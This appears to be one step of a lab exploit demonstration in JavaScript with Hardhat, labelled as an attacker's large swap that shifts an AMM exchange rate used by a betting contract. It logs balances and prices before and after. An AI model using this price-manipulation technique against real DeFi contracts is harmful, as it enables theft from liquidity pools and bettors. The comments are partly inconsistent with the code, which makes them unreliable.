//******* Step 4: Attacker manipulates AMM rate by making large swap  */
//---- swap  Ether to Token ----  */

const { ethers } = require("hardhat");
const {
  TestToken,
  BetContract,
  AMM,
  AMM_Address,
  alchemyProvider,
  TestToken_Address,
  signer,
  AMM_signer,
} = require("./../beforeEach.js");
(async () => {
  try {
    // state before executing swap
    const betRate = await BetContract.betRate();
    const ether_test_rate1 = await AMM_signer.getRate(
      ethers.ZeroAddress,
      TestToken_Address
    );
    const test_ether_rate1 = await AMM_signer.getRate(
      TestToken_Address,
      ethers.ZeroAddress,
    );
    const amm_ether_Balance1 = await alchemyProvider.getBalance(AMM_Address);
    const amm_test_Balance1 = await TestToken.balanceOf(AMM_Address);
    console.log(" • State before executing swap function");
    
    // swap 10 TEST token for ? ether
    const amount_to_swap = ethers.parseUnits("0.001");

    //execute swap function
    const transaction = await AMM_signer.swapETHForTokens(0, {value:amount_to_swap});
    await transaction.wait();
    console.log(transaction);

    // state after executing swap function
    const ether_test_rate2 = await AMM_signer.getRate(
      ethers.ZeroAddress,
      TestToken_Address,
    );
      const test_ether_rate2 = await AMM_signer.getRate(
        TestToken_Address,
        ethers.ZeroAddress, 
    );
    const amm_ether_Balance2 = await alchemyProvider.getBalance(AMM_Address);
    const amm_test_Balance2 = await TestToken.balanceOf(AMM_Address);

    //logs in a table
    console.table([
      {
        Contract: "AMM.sol",
        "Contract Address": AMM_Address,
        "Transaction Hash": transaction.hash,
        function: "swap",
      },
    ]);

    console.log(" • State before executing swap function");
    console.table([
      {
        "AMM - ETHER Balance ": `${ethers.formatUnits(amm_ether_Balance1)} ETH`,
        "AMM - TEST Balance": `${ethers.formatUnits(amm_test_Balance1)} TEST`,
        "AMM - ETHER price": `${ethers.formatUnits(ether_test_rate1)} TEST `,
        "AMM - TEST price": `${ethers.formatUnits(test_ether_rate1)} ETH`,
        "Bet Rate": `${ethers.formatUnits(betRate)}`,
      },
    ]);
    console.table([
      {
        "amount to swap": `${ethers.formatUnits(amount_to_swap)} TEST`,
      },
    ]);
    console.log(" • State after executing swap function ");
    console.table([
      {
        "AMM - ETHER Balance": `${ethers.formatUnits(amm_ether_Balance2)} ETH`,
        "AMM - TEST Balance": `${ethers.formatUnits(amm_test_Balance2)} TEST`,
        "AMM - ETHER price": `${ethers.formatUnits(ether_test_rate2)} TEST`,
        "AMM - TEST price ": `${ethers.formatUnits(test_ether_rate2)} ETH`,
        "Bet Rate": `${ethers.formatUnits(betRate)}`
      },
    ]);
  } catch (error) {
    console.error(error);
  }
})();
